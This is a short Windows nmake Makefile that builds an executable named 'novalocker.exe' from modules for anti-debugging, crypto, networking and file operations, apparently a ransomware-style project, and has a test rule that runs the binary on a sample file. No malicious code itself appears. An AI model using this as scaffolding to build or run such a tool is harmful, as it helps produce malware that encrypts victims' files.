CC=cl
CFLAGS=/O2 /I"include" /DNDEBUG
LDFLAGS=/SUBSYSTEM:CONSOLE
LIBS=kernel32.lib user32.lib ws2_32.lib

SRCDIR=src
SOURCES=$(SRCDIR)/main.c $(SRCDIR)/anti_debug.c $(SRCDIR)/crypto.c $(SRCDIR)/network.c $(SRCDIR)/file_ops.c $(SRCDIR)/utils.c
TARGET=novalocker.exe

$(TARGET): $(SOURCES)
	$(CC) $(CFLAGS) $(SOURCES) $(LIBS) /link $(LDFLAGS) /out:$(TARGET)

clean:
	del /f $(TARGET) *.obj *.pdb

test: $(TARGET)
	mkdir C:\temp\test_files 2>nul || echo Directory exists
	echo Test file content > C:\temp\test_files\sample.txt
	$(TARGET)
